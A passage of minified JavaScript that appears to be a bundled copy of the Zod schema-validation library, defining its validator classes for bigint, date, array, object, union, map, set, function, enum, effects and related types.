B0{constructor(){super(...arguments);this.min=this.gte,this.max=this.lte}_parse(X){if(this._def.coerce)try{X.data=BigInt(X.data)}catch{return this._getInvalidInput(X)}if(this._getType(X)!==T1.bigint)return this._getInvalidInput(X);let J=void 0,Y=new _9;for(let W of this._def.checks)if(W.kind==="min"){if(W.inclusive?X.data<W.value:X.data<=W.value)J=this._getOrReturnCtx(X,J),C1(J,{code:q1.too_small,type:"bigint",minimum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="max"){if(W.inclusive?X.data>W.value:X.data>=W.value)J=this._getOrReturnCtx(X,J),C1(J,{code:q1.too_big,type:"bigint",maximum:W.value,inclusive:W.inclusive,message:W.message}),Y.dirty()}else if(W.kind==="multipleOf"){if(X.data%W.value!==BigInt(0))J=this._getOrReturnCtx(X,J),C1(J,{code:q1.not_multiple_of,multipleOf:W.value,message:W.message}),Y.dirty()}else R0.assertNever(W);return{status:Y.value,value:X.data}}_getInvalidInput(X){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:T1.bigint,received:Q.parsedType}),X0}gte(X,Q){return this.setLimit("min",X,!0,f1.toString(Q))}gt(X,Q){return this.setLimit("min",X,!1,f1.toString(Q))}lte(X,Q){return this.setLimit("max",X,!0,f1.toString(Q))}lt(X,Q){return this.setLimit("max",X,!1,f1.toString(Q))}setLimit(X,Q,J,Y){return new b5({...this._def,checks:[...this._def.checks,{kind:X,value:Q,inclusive:J,message:f1.toString(Y)}]})}_addCheck(X){return new b5({...this._def,checks:[...this._def.checks,X]})}positive(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:f1.toString(X)})}negative(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:f1.toString(X)})}nonpositive(X){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:f1.toString(X)})}nonnegative(X){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:f1.toString(X)})}multipleOf(X,Q){return this._addCheck({kind:"multipleOf",value:X,message:f1.toString(Q)})}get minValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X}get maxValue(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X}};b5.create=(X)=>{return new b5({checks:[],typeName:Q0.ZodBigInt,coerce:X?.coerce??!1,...H0(X)})};BW=class BW extends B0{_parse(X){if(this._def.coerce)X.data=Boolean(X.data);if(this._getType(X)!==T1.boolean){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.boolean,received:J.parsedType}),X0}return l9(X.data)}};BW.create=(X)=>{return new BW({typeName:Q0.ZodBoolean,coerce:X?.coerce||!1,...H0(X)})};wQ=class wQ extends B0{_parse(X){if(this._def.coerce)X.data=new Date(X.data);if(this._getType(X)!==T1.date){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:T1.date,received:W.parsedType}),X0}if(Number.isNaN(X.data.getTime())){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_date}),X0}let J=new _9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.getTime()<W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_small,message:W.message,inclusive:!0,exact:!1,minimum:W.value,type:"date"}),J.dirty()}else if(W.kind==="max"){if(X.data.getTime()>W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_big,message:W.message,inclusive:!0,exact:!1,maximum:W.value,type:"date"}),J.dirty()}else R0.assertNever(W);return{status:J.value,value:new Date(X.data.getTime())}}_addCheck(X){return new wQ({...this._def,checks:[...this._def.checks,X]})}min(X,Q){return this._addCheck({kind:"min",value:X.getTime(),message:f1.toString(Q)})}max(X,Q){return this._addCheck({kind:"max",value:X.getTime(),message:f1.toString(Q)})}get minDate(){let X=null;for(let Q of this._def.checks)if(Q.kind==="min"){if(X===null||Q.value>X)X=Q.value}return X!=null?new Date(X):null}get maxDate(){let X=null;for(let Q of this._def.checks)if(Q.kind==="max"){if(X===null||Q.value<X)X=Q.value}return X!=null?new Date(X):null}};wQ.create=(X)=>{return new wQ({checks:[],coerce:X?.coerce||!1,typeName:Q0.ZodDate,...H0(X)})};qW=class qW extends B0{_parse(X){if(this._getType(X)!==T1.symbol){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.symbol,received:J.parsedType}),X0}return l9(X.data)}};qW.create=(X)=>{return new qW({typeName:Q0.ZodSymbol,...H0(X)})};IQ=class IQ extends B0{_parse(X){if(this._getType(X)!==T1.undefined){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.undefined,received:J.parsedType}),X0}return l9(X.data)}};IQ.create=(X)=>{return new IQ({typeName:Q0.ZodUndefined,...H0(X)})};CQ=class CQ extends B0{_parse(X){if(this._getType(X)!==T1.null){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.null,received:J.parsedType}),X0}return l9(X.data)}};CQ.create=(X)=>{return new CQ({typeName:Q0.ZodNull,...H0(X)})};ZW=class ZW extends B0{constructor(){super(...arguments);this._any=!0}_parse(X){return l9(X.data)}};ZW.create=(X)=>{return new ZW({typeName:Q0.ZodAny,...H0(X)})};q7=class q7 extends B0{constructor(){super(...arguments);this._unknown=!0}_parse(X){return l9(X.data)}};q7.create=(X)=>{return new q7({typeName:Q0.ZodUnknown,...H0(X)})};f8=class f8 extends B0{_parse(X){let Q=this._getOrReturnCtx(X);return C1(Q,{code:q1.invalid_type,expected:T1.never,received:Q.parsedType}),X0}};f8.create=(X)=>{return new f8({typeName:Q0.ZodNever,...H0(X)})};MW=class MW extends B0{_parse(X){if(this._getType(X)!==T1.undefined){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.void,received:J.parsedType}),X0}return l9(X.data)}};MW.create=(X)=>{return new MW({typeName:Q0.ZodVoid,...H0(X)})};Y8=class Y8 extends B0{_parse(X){let{ctx:Q,status:J}=this._processInputParams(X),Y=this._def;if(Q.parsedType!==T1.array)return C1(Q,{code:q1.invalid_type,expected:T1.array,received:Q.parsedType}),X0;if(Y.exactLength!==null){let G=Q.data.length>Y.exactLength.value,H=Q.data.length<Y.exactLength.value;if(G||H)C1(Q,{code:G?q1.too_big:q1.too_small,minimum:H?Y.exactLength.value:void 0,maximum:G?Y.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:Y.exactLength.message}),J.dirty()}if(Y.minLength!==null){if(Q.data.length<Y.minLength.value)C1(Q,{code:q1.too_small,minimum:Y.minLength.value,type:"array",inclusive:!0,exact:!1,message:Y.minLength.message}),J.dirty()}if(Y.maxLength!==null){if(Q.data.length>Y.maxLength.value)C1(Q,{code:q1.too_big,maximum:Y.maxLength.value,type:"array",inclusive:!0,exact:!1,message:Y.maxLength.message}),J.dirty()}if(Q.common.async)return Promise.all([...Q.data].map((G,H)=>{return Y.type._parseAsync(new b6(Q,G,Q.path,H))})).then((G)=>{return _9.mergeArray(J,G)});let W=[...Q.data].map((G,H)=>{return Y.type._parseSync(new b6(Q,G,Q.path,H))});return _9.mergeArray(J,W)}get element(){return this._def.type}min(X,Q){return new Y8({...this._def,minLength:{value:X,message:f1.toString(Q)}})}max(X,Q){return new Y8({...this._def,maxLength:{value:X,message:f1.toString(Q)}})}length(X,Q){return new Y8({...this._def,exactLength:{value:X,message:f1.toString(Q)}})}nonempty(X){return this.min(1,X)}};Y8.create=(X,Q)=>{return new Y8({type:X,minLength:null,maxLength:null,exactLength:null,typeName:Q0.ZodArray,...H0(Q)})};r0=class r0 extends B0{constructor(){super(...arguments);this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;let X=this._def.shape(),Q=R0.objectKeys(X);return this._cached={shape:X,keys:Q},this._cached}_parse(X){if(this._getType(X)!==T1.object){let z=this._getOrReturnCtx(X);return C1(z,{code:q1.invalid_type,expected:T1.object,received:z.parsedType}),X0}let{status:J,ctx:Y}=this._processInputParams(X),{shape:W,keys:G}=this._getCached(),H=[];if(!(this._def.catchall instanceof f8&&this._def.unknownKeys==="strip")){for(let z in Y.data)if(!G.includes(z))H.push(z)}let $=[];for(let z of G){let U=W[z],K=Y.data[z];$.push({key:{status:"valid",value:z},value:U._parse(new b6(Y,K,Y.path,z)),alwaysSet:z in Y.data})}if(this._def.catchall instanceof f8){let z=this._def.unknownKeys;if(z==="passthrough")for(let U of H)$.push({key:{status:"valid",value:U},value:{status:"valid",value:Y.data[U]}});else if(z==="strict"){if(H.length>0)C1(Y,{code:q1.unrecognized_keys,keys:H}),J.dirty()}else if(z==="strip");else throw Error("Internal ZodObject error: invalid unknownKeys value.")}else{let z=this._def.catchall;for(let U of H){let K=Y.data[U];$.push({key:{status:"valid",value:U},value:z._parse(new b6(Y,K,Y.path,U)),alwaysSet:U in Y.data})}}if(Y.common.async)return Promise.resolve().then(async()=>{let z=[];for(let U of $){let K=await U.key,B=await U.value;z.push({key:K,value:B,alwaysSet:U.alwaysSet})}return z}).then((z)=>{return _9.mergeObjectSync(J,z)});else return _9.mergeObjectSync(J,$)}get shape(){return this._def.shape()}strict(X){return f1.errToObj,new r0({...this._def,unknownKeys:"strict",...X!==void 0?{errorMap:(Q,J)=>{let Y=this._def.errorMap?.(Q,J).message??J.defaultError;if(Q.code==="unrecognized_keys")return{message:f1.errToObj(X).message??Y};return{message:Y}}}:{}})}strip(){return new r0({...this._def,unknownKeys:"strip"})}passthrough(){return new r0({...this._def,unknownKeys:"passthrough"})}extend(X){return new r0({...this._def,shape:()=>({...this._def.shape(),...X})})}merge(X){return new r0({unknownKeys:X._def.unknownKeys,catchall:X._def.catchall,shape:()=>({...this._def.shape(),...X._def.shape()}),typeName:Q0.ZodObject})}setKey(X,Q){return this.augment({[X]:Q})}catchall(X){return new r0({...this._def,catchall:X})}pick(X){let Q={};for(let J of R0.objectKeys(X))if(X[J]&&this.shape[J])Q[J]=this.shape[J];return new r0({...this._def,shape:()=>Q})}omit(X){let Q={};for(let J of R0.objectKeys(this.shape))if(!X[J])Q[J]=this.shape[J];return new r0({...this._def,shape:()=>Q})}deepPartial(){return P5(this)}partial(X){let Q={};for(let J of R0.objectKeys(this.shape)){let Y=this.shape[J];if(X&&!X[J])Q[J]=Y;else Q[J]=Y.optional()}return new r0({...this._def,shape:()=>Q})}required(X){let Q={};for(let J of R0.objectKeys(this.shape))if(X&&!X[J])Q[J]=this.shape[J];else{let W=this.shape[J];while(W instanceof W8)W=W._def.innerType;Q[J]=W}return new r0({...this._def,shape:()=>Q})}keyof(){return Ow(R0.objectKeys(this.shape))}};r0.create=(X,Q)=>{return new r0({shape:()=>X,unknownKeys:"strip",catchall:f8.create(),typeName:Q0.ZodObject,...H0(Q)})};r0.strictCreate=(X,Q)=>{return new r0({shape:()=>X,unknownKeys:"strict",catchall:f8.create(),typeName:Q0.ZodObject,...H0(Q)})};r0.lazycreate=(X,Q)=>{return new r0({shape:X,unknownKeys:"strip",catchall:f8.create(),typeName:Q0.ZodObject,...H0(Q)})};PQ=class PQ extends B0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=this._def.options;function Y(W){for(let H of W)if(H.result.status==="valid")return H.result;for(let H of W)if(H.result.status==="dirty")return Q.common.issues.push(...H.ctx.common.issues),H.result;let G=W.map((H)=>new K6(H.ctx.common.issues));return C1(Q,{code:q1.invalid_union,unionErrors:G}),X0}if(Q.common.async)return Promise.all(J.map(async(W)=>{let G={...Q,common:{...Q.common,issues:[]},parent:null};return{result:await W._parseAsync({data:Q.data,path:Q.path,parent:G}),ctx:G}})).then(Y);else{let W=void 0,G=[];for(let $ of J){let z={...Q,common:{...Q.common,issues:[]},parent:null},U=$._parseSync({data:Q.data,path:Q.path,parent:z});if(U.status==="valid")return U;else if(U.status==="dirty"&&!W)W={result:U,ctx:z};if(z.common.issues.length)G.push(z.common.issues)}if(W)return Q.common.issues.push(...W.ctx.common.issues),W.result;let H=G.map(($)=>new K6($));return C1(Q,{code:q1.invalid_union,unionErrors:H}),X0}}get options(){return this._def.options}};PQ.create=(X,Q)=>{return new PQ({options:X,typeName:Q0.ZodUnion,...H0(Q)})};HK=class HK extends B0{_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.object)return C1(Q,{code:q1.invalid_type,expected:T1.object,received:Q.parsedType}),X0;let J=this.discriminator,Y=Q.data[J],W=this.optionsMap.get(Y);if(!W)return C1(Q,{code:q1.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[J]}),X0;if(Q.common.async)return W._parseAsync({data:Q.data,path:Q.path,parent:Q});else return W._parseSync({data:Q.data,path:Q.path,parent:Q})}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(X,Q,J){let Y=new Map;for(let W of Q){let G=k8(W.shape[X]);if(!G.length)throw Error(`A discriminator value for key \`${X}\` could not be extracted from all schema options`);for(let H of G){if(Y.has(H))throw Error(`Discriminator property ${String(X)} has duplicate value ${String(H)}`);Y.set(H,W)}}return new HK({typeName:Q0.ZodDiscriminatedUnion,discriminator:X,options:Q,optionsMap:Y,...H0(J)})}};SQ=class SQ extends B0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X),Y=(W,G)=>{if(RN(W)||RN(G))return X0;let H=aU(W.value,G.value);if(!H.valid)return C1(J,{code:q1.invalid_intersection_types}),X0;if(LN(W)||LN(G))Q.dirty();return{status:Q.value,value:H.data}};if(J.common.async)return Promise.all([this._def.left._parseAsync({data:J.data,path:J.path,parent:J}),this._def.right._parseAsync({data:J.data,path:J.path,parent:J})]).then(([W,G])=>Y(W,G));else return Y(this._def.left._parseSync({data:J.data,path:J.path,parent:J}),this._def.right._parseSync({data:J.data,path:J.path,parent:J}))}};SQ.create=(X,Q,J)=>{return new SQ({left:X,right:Q,typeName:Q0.ZodIntersection,...H0(J)})};h8=class h8 extends B0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.array)return C1(J,{code:q1.invalid_type,expected:T1.array,received:J.parsedType}),X0;if(J.data.length<this._def.items.length)return C1(J,{code:q1.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),X0;if(!this._def.rest&&J.data.length>this._def.items.length)C1(J,{code:q1.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),Q.dirty();let W=[...J.data].map((G,H)=>{let $=this._def.items[H]||this._def.rest;if(!$)return null;return $._parse(new b6(J,G,J.path,H))}).filter((G)=>!!G);if(J.common.async)return Promise.all(W).then((G)=>{return _9.mergeArray(Q,G)});else return _9.mergeArray(Q,W)}get items(){return this._def.items}rest(X){return new h8({...this._def,rest:X})}};h8.create=(X,Q)=>{if(!Array.isArray(X))throw Error("You must pass an array of schemas to z.tuple([ ... ])");return new h8({items:X,typeName:Q0.ZodTuple,rest:null,...H0(Q)})};jW=class jW extends B0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.object)return C1(J,{code:q1.invalid_type,expected:T1.object,received:J.parsedType}),X0;let Y=[],W=this._def.keyType,G=this._def.valueType;for(let H in J.data)Y.push({key:W._parse(new b6(J,H,J.path,H)),value:G._parse(new b6(J,J.data[H],J.path,H)),alwaysSet:H in J.data});if(J.common.async)return _9.mergeObjectAsync(Q,Y);else return _9.mergeObjectSync(Q,Y)}get element(){return this._def.valueType}static create(X,Q,J){if(Q instanceof B0)return new jW({keyType:X,valueType:Q,typeName:Q0.ZodRecord,...H0(J)});return new jW({keyType:x8.create(),valueType:X,typeName:Q0.ZodRecord,...H0(Q)})}};FW=class FW extends B0{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.map)return C1(J,{code:q1.invalid_type,expected:T1.map,received:J.parsedType}),X0;let Y=this._def.keyType,W=this._def.valueType,G=[...J.data.entries()].map(([H,$],z)=>{return{key:Y._parse(new b6(J,H,J.path,[z,"key"])),value:W._parse(new b6(J,$,J.path,[z,"value"]))}});if(J.common.async){let H=new Map;return Promise.resolve().then(async()=>{for(let $ of G){let z=await $.key,U=await $.value;if(z.status==="aborted"||U.status==="aborted")return X0;if(z.status==="dirty"||U.status==="dirty")Q.dirty();H.set(z.value,U.value)}return{status:Q.value,value:H}})}else{let H=new Map;for(let $ of G){let{key:z,value:U}=$;if(z.status==="aborted"||U.status==="aborted")return X0;if(z.status==="dirty"||U.status==="dirty")Q.dirty();H.set(z.value,U.value)}return{status:Q.value,value:H}}}};FW.create=(X,Q,J)=>{return new FW({valueType:Q,keyType:X,typeName:Q0.ZodMap,...H0(J)})};v5=class v5 extends B0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.parsedType!==T1.set)return C1(J,{code:q1.invalid_type,expected:T1.set,received:J.parsedType}),X0;let Y=this._def;if(Y.minSize!==null){if(J.data.size<Y.minSize.value)C1(J,{code:q1.too_small,minimum:Y.minSize.value,type:"set",inclusive:!0,exact:!1,message:Y.minSize.message}),Q.dirty()}if(Y.maxSize!==null){if(J.data.size>Y.maxSize.value)C1(J,{code:q1.too_big,maximum:Y.maxSize.value,type:"set",inclusive:!0,exact:!1,message:Y.maxSize.message}),Q.dirty()}let W=this._def.valueType;function G($){let z=new Set;for(let U of $){if(U.status==="aborted")return X0;if(U.status==="dirty")Q.dirty();z.add(U.value)}return{status:Q.value,value:z}}let H=[...J.data.values()].map(($,z)=>W._parse(new b6(J,$,J.path,z)));if(J.common.async)return Promise.all(H).then(($)=>G($));else return G(H)}min(X,Q){return new v5({...this._def,minSize:{value:X,message:f1.toString(Q)}})}max(X,Q){return new v5({...this._def,maxSize:{value:X,message:f1.toString(Q)}})}size(X,Q){return this.min(X,Q).max(X,Q)}nonempty(X){return this.min(1,X)}};v5.create=(X,Q)=>{return new v5({valueType:X,minSize:null,maxSize:null,typeName:Q0.ZodSet,...H0(Q)})};LQ=class LQ extends B0{constructor(){super(...arguments);this.validate=this.implement}_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.function)return C1(Q,{code:q1.invalid_type,expected:T1.function,received:Q.parsedType}),X0;function J(H,$){return nU({data:H,path:Q.path,errorMaps:[Q.common.contextualErrorMap,Q.schemaErrorMap,rU(),NQ].filter((z)=>!!z),issueData:{code:q1.invalid_arguments,argumentsError:$}})}function Y(H,$){return nU({data:H,path:Q.path,errorMaps:[Q.common.contextualErrorMap,Q.schemaErrorMap,rU(),NQ].filter((z)=>!!z),issueData:{code:q1.invalid_return_type,returnTypeError:$}})}let W={errorMap:Q.common.contextualErrorMap},G=Q.data;if(this._def.returns instanceof x5){let H=this;return l9(async function(...$){let z=new K6([]),U=await H._def.args.parseAsync($,W).catch((q)=>{throw z.addIssue(J($,q)),z}),K=await Reflect.apply(G,this,U);return await H._def.returns._def.type.parseAsync(K,W).catch((q)=>{throw z.addIssue(Y(K,q)),z})})}else{let H=this;return l9(function(...$){let z=H._def.args.safeParse($,W);if(!z.success)throw new K6([J($,z.error)]);let U=Reflect.apply(G,this,z.data),K=H._def.returns.safeParse(U,W);if(!K.success)throw new K6([Y(U,K.error)]);return K.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...X){return new LQ({...this._def,args:h8.create(X).rest(q7.create())})}returns(X){return new LQ({...this._def,returns:X})}implement(X){return this.parse(X)}strictImplement(X){return this.parse(X)}static create(X,Q,J){return new LQ({args:X?X:h8.create([]).rest(q7.create()),returns:Q||q7.create(),typeName:Q0.ZodFunction,...H0(J)})}};EQ=class EQ extends B0{get schema(){return this._def.getter()}_parse(X){let{ctx:Q}=this._processInputParams(X);return this._def.getter()._parse({data:Q.data,path:Q.path,parent:Q})}};EQ.create=(X,Q)=>{return new EQ({getter:X,typeName:Q0.ZodLazy,...H0(Q)})};TQ=class TQ extends B0{_parse(X){if(X.data!==this._def.value){let Q=this._getOrReturnCtx(X);return C1(Q,{received:Q.data,code:q1.invalid_literal,expected:this._def.value}),X0}return{status:"valid",value:X.data}}get value(){return this._def.value}};TQ.create=(X,Q)=>{return new TQ({value:X,typeName:Q0.ZodLiteral,...H0(Q)})};Z7=class Z7 extends B0{_parse(X){if(typeof X.data!=="string"){let Q=this._getOrReturnCtx(X),J=this._def.values;return C1(Q,{expected:R0.joinValues(J),received:Q.parsedType,code:q1.invalid_type}),X0}if(!this._cache)this._cache=new Set(this._def.values);if(!this._cache.has(X.data)){let Q=this._getOrReturnCtx(X),J=this._def.values;return C1(Q,{received:Q.data,code:q1.invalid_enum_value,options:J}),X0}return l9(X.data)}get options(){return this._def.values}get enum(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}get Values(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}get Enum(){let X={};for(let Q of this._def.values)X[Q]=Q;return X}extract(X,Q=this._def){return Z7.create(X,{...this._def,...Q})}exclude(X,Q=this._def){return Z7.create(this.options.filter((J)=>!X.includes(J)),{...this._def,...Q})}};Z7.create=Ow;_Q=class _Q extends B0{_parse(X){let Q=R0.getValidEnumValues(this._def.values),J=this._getOrReturnCtx(X);if(J.parsedType!==T1.string&&J.parsedType!==T1.number){let Y=R0.objectValues(Q);return C1(J,{expected:R0.joinValues(Y),received:J.parsedType,code:q1.invalid_type}),X0}if(!this._cache)this._cache=new Set(R0.getValidEnumValues(this._def.values));if(!this._cache.has(X.data)){let Y=R0.objectValues(Q);return C1(J,{received:J.data,code:q1.invalid_enum_value,options:Y}),X0}return l9(X.data)}get enum(){return this._def.values}};_Q.create=(X,Q)=>{return new _Q({values:X,typeName:Q0.ZodNativeEnum,...H0(Q)})};x5=class x5 extends B0{unwrap(){return this._def.type}_parse(X){let{ctx:Q}=this._processInputParams(X);if(Q.parsedType!==T1.promise&&Q.common.async===!1)return C1(Q,{code:q1.invalid_type,expected:T1.promise,received:Q.parsedType}),X0;let J=Q.parsedType===T1.promise?Q.data:Promise.resolve(Q.data);return l9(J.then((Y)=>{return this._def.type.parseAsync(Y,{path:Q.path,errorMap:Q.common.contextualErrorMap})}))}};x5.create=(X,Q)=>{return new x5({type:X,typeName:Q0.ZodPromise,...H0(Q)})};H8=class H8 extends B0{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===Q0.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(X){let{status:Q,ctx:J}=this._processInputParams(X),Y=this._def.effect||null,W={addIssue:(G)=>{if(C1(J,G),G.fatal)Q.abort();else Q.dirty()},get path(){return J.path}};if(W.addIssue=W.addIssue.bind(W),Y.type==="preprocess"){let G=Y.transform(J.data,W);if(J.common.async)return Promise.resolve(G).then(async(H)=>{if(Q.value==="aborted")return X0;let $=await this._def.schema._parseAsync({data:H,path:J.path,parent:J});if($.status==="aborted")return X0;if($.status==="dirty")return AQ($.value);if(Q.value==="dirty")return AQ($.value);return $});else{if(Q.value==="aborted")return X0;let H=this._def.schema._parseSync({data:G,path:J.path,parent:J});if(H.status==="aborted")return X0;if(H.status==="dirty")return AQ(H.value);if(Q.value==="dirty")return AQ(H.value);return H}}if(Y.type==="refinement"){let G=(H)=>{let $=Y.refinement(H,W);if(J.common.async)return Promise.resolve($);if($ instanceof Promise)throw Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return H};if(J.common.async===!1){let H=this._def.schema._parseSync({data:J.data,path:J.path,parent:J});if(H.status==="aborted")return X0;if(H.status==="dirty")Q.dirty();return G(H.value),{status:Q.value,value:H.value}}else return this._def.schema._parseAsync({data:J.data,path:J.path,parent:J}).then((H)=>{if(H.status==="aborted")return X0;if(H.status==="dirty")Q.dirty();return G(H.value).then(()=>{return{status:Q.value,value:H.value}})})}if(Y.type==="transform")if(J.common.async===!1){let G=this._def.schema._parseSync({data:J.data,path:J.path,parent:J});if(!_5(G))return X0;let H=Y.transform(G.value,W);if(H instanceof Promise)throw Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:Q.value,value:H}}else return this._def.schema._parseAsync({data:J.data,path:J.path,parent:J}).then((G)=>{if(!_5(G))return X0;return Promise.resolve(Y.transform(G.value,W)).then((H)=>({status:Q.value,value:H}))});R0.assertNever(Y)}};H8.create=(X,Q,J)=>{return new H8({schema:X,typeName:Q0.ZodEffects,effect:Q,...H0(J)})};H8.createWithPreprocess=(X,Q,J)=>{return new H8({schema:Q,effect:{type:"preprocess",transform:X},typeName:Q0.ZodEffects,...H0(J)})};W8=class W8 extends B0{_parse(X){if(this._getType(X)===T1.undefined)return l9(void 0);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}};W8.create=(X,Q)=>{return new W8({innerType:X,typeName:Q0.ZodOptional,...H0(Q)})};wX=class wX extends B0{_parse(X){if(this._getType(X)===T1.null)return l9(null);return this._def.innerType._parse(X)}unwrap(){return this._def.innerType}};wX.create=(X,Q)=>{return new wX({innerType:X,typeName:Q0.ZodNullable,...H0(Q)})};kQ=class kQ extends B0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=Q.data;if(Q.parsedType===T1.undefined)J=this._def.defaultValue();return this._def.innerType._parse({data:J,path:Q.path,parent:Q})}removeDefault(){return this._def.innerType}};kQ.create=(X,Q)=>{return new kQ({innerType:X,typeName:Q0.ZodDefault,defaultValue:typeof Q.default==="function"?Q.default:()=>Q.default,...H0(Q)})};bQ=class bQ extends B0{_parse(X){let{ctx:Q}=this._processInputParams(X),J={...Q,common:{...Q.common,issues:[]}},Y=this._def.innerType._parse({data:J.data,path:J.path,parent:{...J}});if(VW(Y))return Y.then((W)=>{return{status:"valid",value:W.status==="valid"?W.value:this._def.catchValue({get error(){return new K6(J.common.issues)},input:J.data})}});else return{status:"valid",value:Y.status==="valid"?Y.value:this._def.catchValue({get error(){return new K6(J.common.issues)},input:J.data})}}removeCatch(){return this._def.innerType}};bQ.create=(X,Q)=>{return new bQ({innerType:X,typeName:Q0.ZodCatch,catchValue:typeof Q.catch==="function"?Q.catch:()=>Q.catch,...H0(Q)})};OW=class OW extends B0{_parse(X){if(this._getType(X)!==T1.nan){let J=this._getOrReturnCtx(X);return C1(J,{code:q1.invalid_type,expected:T1.nan,received:J.parsedType}),X0}return{status:"valid",value:X.data}}};OW.create=(X)=>{return new OW({typeName:Q0.ZodNaN,...H0(X)})};az0=Symbol("zod_brand");$K=class $K extends B0{_parse(X){let{ctx:Q}=this._processInputParams(X),J=Q.data;return this._def.type._parse({data:J,path:Q.path,parent:Q})}unwrap(){return this._def.type}};PW=class PW extends B0{_parse(X){let{status:Q,ctx:J}=this._processInputParams(X);if(J.common.async)return(async()=>{let W=await this._def.in._parseAsync({data:J.data,path:J.path,parent:J});if(W.status==="aborted")return X0;if(W.status==="dirty")return Q.dirty(),AQ(W.value);else return this._def.out._parseAsync({data:W.value,path:J.path,parent:J})})();else{let Y=this._def.in._parseSync({data:J.data,path:J.path,parent:J});if(Y.status==="aborted")return X0;if(Y.status==="dirty")return Q.dirty(),{status:"dirty",value:Y.value};else return this._def.out._parseSync({data:Y.value,path:J.path,parent:J})}}static create(X,Q){return new PW({in:X,out:Q,typeName:Q0.ZodPipeline})}};vQ=class vQ extends B0{_parse(X){let Q=this._def.innerType._parse(X),J=(Y)=>{if(_5(Y))Y.value=Object.freeze(Y.value);return Y};return VW(Q)?Q.then((Y)=>J(Y)):J(Q)}unwrap(){return this._def.innerType}};vQ.create=(X,Q)=>{return new vQ({innerType:X,typeName:Q0.ZodReadonly,...H0(Q)})};oz0={object:r0.lazycreate};(function(X){X.ZodString="ZodString",X.ZodNumber="ZodNumber",X.ZodNaN="ZodNaN",X.ZodBigInt="ZodBigInt",X.ZodBoolean="ZodBoolean",X.ZodDate="ZodDate",X.ZodSymbol="ZodSymbol",X.ZodUndefined="ZodUndefined",X.ZodNull="ZodNull",X.ZodAny="ZodAny",X.ZodUnknown="ZodUnknown",X.ZodNever="ZodNever",X.ZodVoid="ZodVoid",X.ZodArray="ZodArray",X.ZodObject="ZodObject",X.ZodUnion="ZodUnion",X.ZodDiscriminatedUnion="ZodDiscriminatedUnion",X.ZodIntersection="ZodIntersection",X.ZodTuple="ZodTuple",X.ZodRecord="ZodRecord",X.ZodMap="ZodMap",X.ZodSet="ZodSet",X.ZodFunction="ZodFunction",X.ZodLazy="ZodLazy",X.ZodLiteral="ZodLiteral",X.ZodEnum="ZodEnum",X.ZodEffects="ZodEffects",X.ZodNativeEnum="ZodNativeEnum",X.ZodOptional="ZodOptional",X.ZodNullable="ZodNullable",X.ZodDefault="ZodDefault",X.ZodCatch="ZodCatch",X.ZodPromise="ZodPromise",X.ZodBranded="ZodBranded",X.ZodPipeline="ZodPipeline",X.ZodReadonly="ZodReadonly"})(Q0||(Q0={}));sz0=x8.create,tz0=k5.create,ez0=OW.create,XU0=b5.create,QU0=BW.create,JU0=wQ.create,YU0=qW.create,WU0=IQ.create,GU0=CQ.create,HU0=ZW.create,$U0=q7.create,zU0=f8.create,UU0=MW.create,KU0=Y8.create,VU0=r0.create,BU0=r0.strictCreate,qU0=PQ.create,ZU0=HK.create,MU0=SQ.create,jU0=h8.create,FU0=jW.create,OU0=FW.create,AU0=v5.create,RU0=LQ.create,LU0=EQ.create,DU0=TQ.create,NU0=Z7.create,wU0=_Q.create,IU0=x5.create,CU0=H8.create,PU0=W8.create,SU0=wX.create,EU0=H8.createWithPreprocess,TU0=PW.create,_U0=Object.freeze({status:"aborted"});kU0=Symbol("zod_brand");f5=class f5 extends Error{constructor(){super("Encountered Promise during synchronous parse. Use .parseAsync() 